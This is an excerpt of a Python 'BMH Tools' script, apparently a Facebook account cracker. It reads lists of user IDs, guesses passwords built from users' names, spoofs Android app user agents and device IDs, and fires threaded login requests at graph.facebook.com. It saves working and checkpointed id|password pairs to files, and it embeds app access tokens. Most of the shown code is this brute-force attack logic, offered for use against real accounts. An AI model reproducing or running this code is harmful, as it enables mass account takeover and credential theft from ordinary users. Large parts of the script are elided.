...
print('\033[1;95m[•] Follow My Account')
...
for xd in range(10000):
	...
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.196'
...
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 13);'
        b=random.choice(['6','7','8','9','10','11','12','12.0.1','13'])
...
\033[1;97m ########  ##     ## ##     ##          #######  \033[1;92m ✓
\033[1;97m ##     ## ###   ### ##     ##         ##     ## \033[1;92m P
\033[1;97m ##     ## #### #### ##     ##                ## \033[1;95m R
\033[1;97m ########  ## ### ## ######### #######  #######  \033[1;91m 0
\033[1;97m ##     ## ##     ## ##     ##         ##
\033[1;97m ##     ## ##     ## ##     ##         ##
\033[1;97m ########  ##     ## ##     ##         #########
              \033[1;92m 𝕎𝕖𝕝𝕔𝕠𝕞𝕖 𝕋𝕠 𝔹𝕄ℍ 𝕋𝕠𝕠𝕝𝕤
\033[1;36m +/+\+/+\+/+\+/+\+/+\+/+\+/+\+/+\+/+\+/+\+/+\+/+\+/+\+
\033[1;97m [~] Owner By :\033[1;96m 𝔹𝕄ℍ-ℂ𝕐𝔹𝔼ℝ
\033[1;97m [~] Facebook :\033[1;96m 𝔸𝕦𝕟𝕘-ℤ𝕚𝕟-𝕄𝕚𝕟
\033[1;97m [~] Tool     :\033[1;95m 𝔹𝕄ℍ-𝟚
\033[1;97m [~] Version  :\033[1;92m 𝟙.𝟘.𝟛
\033[1;97m [~] Git Hub  :\033[1;96m 𝔹𝕄ℍ-ℂ𝕐𝔹𝔼ℝ
\033[1;97m [~] Status   :\033[1;96m 𝕎𝕒𝕚𝕥 𝔽𝕣𝕖𝕖 𝕆𝕥𝕙𝕖𝕣 𝕌𝕡𝕕𝕒𝕥𝕖 && 𝔾𝕞𝕒𝕚𝕝 ℂ𝕝𝕠𝕟𝕖
\033[1;96m !+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!+!""")
def linex():
...
def menu():
		...
		#	linex()
			...
			print('\033[1;97m [1] ℂ𝕃𝕆ℕ𝔼 𝕎𝕀𝕋ℍ 𝔽𝕀𝕃𝔼\033[1;92m{/sdcard/BMH.txt}\n \033[1;97m[2]\033[1;97m ℂ𝕠𝕟𝕟𝕖𝕔𝕥 𝕆𝕨𝕟𝕖𝕣 𝕄𝕖𝕤𝕤𝕖𝕟𝕘𝕖𝕣 \n [0]\033[1;97m 𝔼𝕩𝕚𝕥 𝕄𝕖𝕟𝕦')
			linex()
			xd=input(' Choose an option: ')
			if xd in ['1','01']:
				clear()
				print('\033[1;91m Put File Example:  \033[1;92m /sdcard/BMH.txt  etc..')
				linex()
				...
				try:
					...
					menu()
				clear()
				print('\033[1;91m Working Tool ')
				linex()
				print(' \033[1;33m[1] \033[1;37mMethod  (for mix ids)  \033[1;32m (fast) \n\033[1;33m [2] \033[1;37mMethod  (for mix ids) \033[1;32m  (best)  \n\033[1;33m [3]\033[1;37m Method  (with cokies)\033[1;32m   (v.fast) \n\033[1;33m [4] \033[1;37mMethod  (for mix ids) \033[1;32m  (no cookie) \n\033[1;33m [5] \033[1;37mMethod  (for mix id) \033[1;32m  (with cookie)')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input(' Password add limit ? '))
				except:
					ps_limit =1
				clear()
				...
				clear()
				print(' You went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				...
				with tred(max_workers=30) as crack_submit:
					...
					print('\033[1;92m Total account ids : \033[1;32m'+total_ids+f' ')
					print(' \033[1;31mTool is running wait for cp && ok account')
					linex()
					for user in fo:
				...
				print('\033[1;37m')
				linex()
				print(' Tool is completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				input(' Press enter to back bmh-2 tool ')
				os.system('python bmh.py')
			elif xd in ['6','06']:
				pak()
			elif xd in ['5','05']:
...
def gmail():
		...
		with tred(max_workers=30) as MMH:
			...
			print(' \033[1;31mTool is running ')
			linex()
			for user in fo:
				ids,names = user.split('|')
				...
				if mthd in ['1','01']:
					edit.submit(edit1,ids,passlist)
				if mthd in ['2','02']:
					edit.submit(edit2,ids,passlist)
				if mthd in ['3','03']:
					edit.submit(edit3,ids,passlist)
				if mthd in ['4','04']:
					edit.submit(edit4,ids,passlist)
				if mthd in ['5','05']:
					edit.submit(edit5,ids,passlist)
				if mthd in ['6','06']:
					edit.submit(edit6,ids,passlist)
		print('\033[1;37m')
		linex()
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;32m [BMH-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/mbasic.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=3.0,width=1080,height=2408};]'
				li = ['28','29','210']
				...
				if 'session_key' in q:
					...
					if 'y' in pcp:
						print('\r\r\x1b[1;91m [BMH-CP∆] '+ids+' | '+pas+'\033[1;97m')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;32m [BMH-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua_string ='Mozilla/5.0 (Android 11.0; SM-Note20 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.224 Mobile Safari/537.36'
                        ...
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua_string,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m [BMH-2F¥] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [BMH-CP∆] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BMH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;32m [BMH-M3] %s|\033[1;32m OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        useragent  = "Mozilla/5.0 (Linux; Android 9; SM-G9550 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.50 eliboM Safari/537.36"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;32m [BMH-M4] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=3.0,width=1440,height=3120};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [BMH-OK✓] '+ids+' | '+pas+'\033[1;92m')
                                        open('/sdcard/BMH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\033[1;91m [BMH-CP∆] '+ids+' | '+pas+'\033[1;91m')
                                                open('/sdcard/BMH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;32m [BMH-M5] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
                        ...
                        en = random.choice(['en_US','en_GB'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua = "Mozilla/5.0 (Android 10; Infinix X688B Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.2987.108 UCBrowser/12.10.0.1163 UCTurbo/1.10.6.900 Mobile Safari/537.36"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
